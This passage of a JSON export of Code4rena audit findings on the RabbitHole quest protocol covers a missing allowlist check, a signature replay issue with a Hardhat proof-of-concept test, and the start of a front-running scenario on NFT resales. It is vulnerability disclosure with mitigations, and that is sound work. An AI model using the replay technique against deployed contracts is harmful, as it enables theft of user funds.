class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">questAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">QuestIdUsed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contractType_</span><span class=\"mtk1\">)) == </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">'erc20'</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">rewardAllowlist</span><span class=\"mtk1\">[</span><span class=\"mtk12\">rewardTokenAddress_</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardNotAllowed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Erc20Quest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Erc20Quest</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardTokenAddress_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">endTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">startTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">totalParticipants_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardAmountOrTokenId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rabbitholeReceiptContract</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">questFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">protocolFeeRecipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">86</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">QuestCreated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">contractType_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardTokenAddress_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">93</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">endTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">startTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">totalParticipants_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardAmountOrTokenId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">questAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">totalParticipants</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalParticipants_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:           ++</span><span class=\"mtk12\">questIdCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contractType_</span><span class=\"mtk1\">)) == </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">'erc1155'</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OnlyOwnerCanCreate1155Quest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Erc1155Quest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Erc1155Quest</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardTokenAddress_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">endTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">startTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">totalParticipants_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardAmountOrTokenId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rabbitholeReceiptContract</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">QuestCreated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">contractType_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardTokenAddress_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">endTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">startTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">totalParticipants_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">rewardAmountOrTokenId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">questAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">totalParticipants</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalParticipants_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:            ++</span><span class=\"mtk12\">questIdCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newQuest</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">QuestTypeInvalid</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Consider adding a check to ensure the contract address is allowed to be used as a reward on erc1155 quests as well:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contractType_</span><span class=\"mtk1\">)) == </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">'erc1155'</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OnlyOwnerCanCreate1155Quest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+               </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">rewardAllowlist</span><span class=\"mtk1\">[</span><span class=\"mtk12\">rewardTokenAddress_</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardNotAllowed</span><span class=\"mtk1\">();</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "#l-01-createquest-doesnt-check-if-the-reward-token-address-is-in-the-allow-list-on-erc-1155-quest-type",
      "tags": [],
      "finders": []
    },
    {
      "id": "8860",
      "title": "[M-09] Possible scenario for Signature Replay Attack",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L219-L229>\n\nThe `QuestFactory.mintReceipt` function mints `RabbitHoleReceipt` tokens based upon signatures signed by `claimSignerAddress`.\n\n```solidity\n    function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();\n        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();\n        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();\n\n        quests[questId_].addressMinted[msg.sender] = true;\n        quests[questId_].numberMinted++;\n        emit ReceiptMinted(msg.sender, questId_);\n        rabbitholeReceiptContract.mint(msg.sender, questId_);\n    }\n```\n\nIn the above function only the account's address and quest id values are used to generate and validate the signature.\n\nThis causes various issues which are mentioned below:\n\n1.  There is no deadline for the signatures. Once a signature is signed by `claimSignerAddress` that signature can be provided to `QuestFactory.mintReceipt` function to mint an RabbitholeReceipt token at any point in the future.\n\n2.  The signature can be replayed on other EVM compatible chains on which RabbitHole protocol is deployed. The [docs](https://github.com/rabbitholegg/quest-protocol/tree/8c4c1f71221570b14a0479c216583342bd652d8d#deployments) mention other EVM chain addresses of the contracts which means the protocol will be deployed on multiple chains.\n\n3.  The signature can be replayed on multiple instances of QuestFactory contract. If multiple QuestFactory contracts are deployed on a single EVM chain then signature intended for one contract can be replayed on the other ones.\n\nNote that all these scenarios are true when `questId_` parameter stays same.\n\n### Actual Impact\n\nExploitation using the above mentioned scenarios will lead to unintended minting of RabbitholeReceipt token. This is a crucial token for the protocol which is also used to claim rewards from Quest contracts. Hence any unintentional minting will cause loss of funds.\n\n### Proof of Concept\n\nThe test cases were added in `./test/QuestFactory.spec.ts` file and ran using command `npx hardhat test ./test/QuestFactory.spec.ts`.\n\n```typescript\n  describe.only('QuestFactory: Signature Replay Bug', () => {\n    it('Signature can be used in different QuestFactory instance or on different chain', async () => {\n      const randomUser = (await ethers.getSigners())[10];\n      const questA = \"A\";\n\n      // Sign message and create new Quest\n      const messageHash = utils.solidityKeccak256(['address', 'string'], [randomUser.address.toLowerCase(), questA])\n      const signature = await wallet.signMessage(utils.arrayify(messageHash))\n      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)\n      await deployedFactoryContract.createQuest(\n        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA\n      )\n\n      // Use the signature on First QuestFactory\n      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)\n      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)\n\n      const factoryPrevious = deployedFactoryContract\n      const RHRPrevious = deployedRabbitHoleReceiptContract\n\n      // Deploy a new QuestFactory (this could be on a different chain)\n      await deployRabbitHoleReceiptContract()\n      await deployFactoryContract()\n\n      expect(factoryPrevious.address).to.not.eq(deployedFactoryContract.address)            // Verify we have new instance\n      expect(RHRPrevious.address).to.not.eq(deployedRabbitHoleReceiptContract.address)\n\n      // Create new Quest in new QuestFactory\n      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)\n      await deployedFactoryContract.createQuest(\n        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA\n      )\n\n      // Use the previously used signature again on new QuestFactory\n      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)\n      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)\n      expect(await RHRPrevious.balanceOf(randomUser.address)).to.equal(1)\n    })\n\n    it('Signature can be used after 1 year', async () => {\n      const randomUser = (await ethers.getSigners())[10];\n      const questA = \"A\";\n\n      // Sign message and create new Quest\n      const messageHash = utils.solidityKeccak256(['address', 'string'], [randomUser.address.toLowerCase(), questA])\n      const signature = await wallet.signMessage(utils.arrayify(messageHash))\n      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)\n      await deployedFactoryContract.createQuest(\n        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA\n      )\n\n      // Move ahead 1 year\n      await ethers.provider.send(\"evm_mine\", [expiryDate + 31536000])\n\n      // Use the signature\n      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)\n      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)\n    })\n  })\n```\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nConsider including deadline, chainid and QuestFactory's address in the signature message. Ideally signatures should be created according to the [EIP712](https://eips.ethereum.org/EIPS/eip-712) standard.\n\n**[kirk-baird (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/107#issuecomment-1429416312)**\n\n**[waynehoover (RabbitHole) disagreed with severity and commented via duplicate issue `#45`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/45#issuecomment-1421424612):**\n > You canâ€™t run a Quest on multiple chains, the assumption is incorrect there.\n\n**[kirk-baird (judge) commented via duplicate issue `#45`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/45#issuecomment-1429433209):**\n > This issue is rated medium as signatures cannot be replayed on this contract, they can only be replayed on other contracts. They may be replayed on other contracts on the same chain or different chains. If there was the possibility for signature replay on this contract then it would be rated as high.\n\n**[AkshaySrivastav (warden) commented via duplicate issue `#45`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/45#issuecomment-1441252597):**\n > @kirk-baird - The protocol docs clearly stated the intention of deploying the contracts on multiple chains, even contract addresses were provided. Considering that, the attack is very likely to happen with clear loss of funds (high impact + high likelihood).\n\n**[kirk-baird (judge) commented via duplicate issue `#45`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/45#issuecomment-1441399684):**\n > @AkshaySrivastav - I do not believe high likelihood is appropriate here. I agree protocol will be deployed on multiple chains, however for the signature replay to be valid the pair `(questId, signer)`  must match on different chains.\n> \n> As stated by the sponsor each quest should only be run on a single chain such that this overlap is unlikely. Furthermore, even if a quest is run on multiple chains starting at the same time it will likely not have the same `questId` as this is a counter incremented for each created quest unique to each chain. Note an attacker may deliberately manipualte this by using a front-running attack in the mempool.\n> \n> To provide some arguements for the severity it is possible for a quest owner to use the same signer on multiple quests over multiple chains and there is a possibility two of these quests have overlapping ID on different chains. However, this is not a high likelihood situation and thus I think medium severity is most appropriate here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is related to the `QuestFactory.mintReceipt` function from the RabbitHole Protocol which is used to mint `RabbitHoleReceipt` tokens. This function uses signatures signed by `claimSignerAddress` to mint tokens. The bug is that the signature can be replayed on other EVM compatible chains on which RabbitHole protocol is deployed and also on multiple instances of QuestFactory contract. This can lead to unintended minting of RabbitholeReceipt token which is a crucial token for the protocol and can cause loss of funds.\n\nTo test this bug, test cases were added in the `./test/QuestFactory.spec.ts` file and ran using the command `npx hardhat test ./test/QuestFactory.spec.ts`. This showed that the signature can be used in different QuestFactory instance or on different chain and also be used after 1 year.\n\nThe recommended mitigation steps are to include deadline, chainid and QuestFactory's address in the signature message and consider using the EIP712 standard for signatures.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/107",
      "tags": [],
      "finders": [
        "critical-or-high",
        "glcanvas",
        "jesusrod15",
        "ladboy233",
        "halden",
        "Tointer",
        "m9800",
        "SovaSlava",
        "rbserver",
        "minhquanym",
        "AkshaySrivastav",
        "rom",
        "hihen",
        "cccz",
        "peakbolt",
        "betweenETHlines",
        "wait",
        "Tricko",
        "zaskoh",
        "KIntern_NA",
        "__141345__",
        "omis",
        "bin2chen",
        "rvierdiiev",
        "V_B",
        "libratus"
      ]
    },
    {
      "id": "8859",
      "title": "[M-08] Buyer on secondary NFT market can lose fund if they buy a NFT that is already used to claim the reward",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L113>\n\nLet us look closely into the `Quest.sol#claim` function\n\n```solidity\n/// @notice Allows user to claim the rewards entitled to them\n/// @dev User can claim based on the (unclaimed) number of tokens they own of the Quest\nfunction claim() public virtual onlyQuestActive {\n\tif (isPaused) revert QuestPaused();\n\n\tuint[] memory tokens = rabbitHoleReceiptContract.getOwnedTokenIdsOfQuest(questId, msg.sender);\n\n\tif (tokens.length == 0) revert NoTokensToClaim();\n\n\tuint256 redeemableTokenCount = 0;\n\tfor (uint i = 0; i < tokens.length; i++) {\n\t\tif (!isClaimed(tokens[i])) {\n\t\t\tredeemableTokenCount++;\n\t\t}\n\t}\n\n\tif (redeemableTokenCount == 0) revert AlreadyClaimed();\n\n\tuint256 totalRedeemableRewards = _calculateRewards(redeemableTokenCount);\n\t_setClaimed(tokens);\n\t_transferRewards(totalRedeemableRewards);\n\tredeemedTokens += redeemableTokenCount;\n\n\temit Claimed(msg.sender, totalRedeemableRewards);\n}\n```\n\nAfter the NFT is used to claim, the \\_setClaimed(token) is called to mark the NFT as used to prevent double claiming.\n\n```solidity\n/// @notice Marks token ids as claimed\n/// @param tokenIds_ The token ids to mark as claimed\nfunction _setClaimed(uint256[] memory tokenIds_) private {\n\tfor (uint i = 0; i < tokenIds_.length; i++) {\n\t\tclaimedList[tokenIds_[i]] = true;\n\t}\n}\n```\n\nThe NFT is also tradeable in the secondary marketplace. I would like to make a reasonable assumption that user wants to buy the NFT because they can use the NFT to claim the reward, which means after the reward is claimed, the NFT lose value.\n\nConsider the case below:\n\n1.  User A has 1 NFT, has he can use the NFT to claim 1 ETH reward.\n2.  User A place a sell order in opensea and sell the NFT for 0.9 ETH.\n3.  User B see the sell order and find it a good trae, he wants to buy the NFT.\n4.  User B submit a buy order, User A at the same time submit the claimReward transaction.\n5.  User A's transaction executed first, reward goes to User A, then User B transaction executed, NFT ownership goes to User B, but user B find out that the he cannot claim the reward becasue the reward is already claimed by User A.\n\nUser A can 